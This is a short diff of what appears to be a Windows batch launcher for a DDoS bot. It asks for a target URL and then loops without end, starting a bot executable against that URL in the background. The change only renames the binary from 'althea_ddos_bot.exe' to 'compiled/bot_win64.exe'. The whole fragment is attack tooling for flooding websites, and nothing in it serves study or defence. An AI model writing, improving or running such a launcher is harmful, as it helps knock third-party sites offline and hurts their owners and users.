@@ -5,5 +5,5 @@ color 0b
 set /p url=Please Enter URL: 
 
 :loop
-althea_ddos_bot.exe %url% &
+compiled/bot_win64.exe %url% &
 goto loop
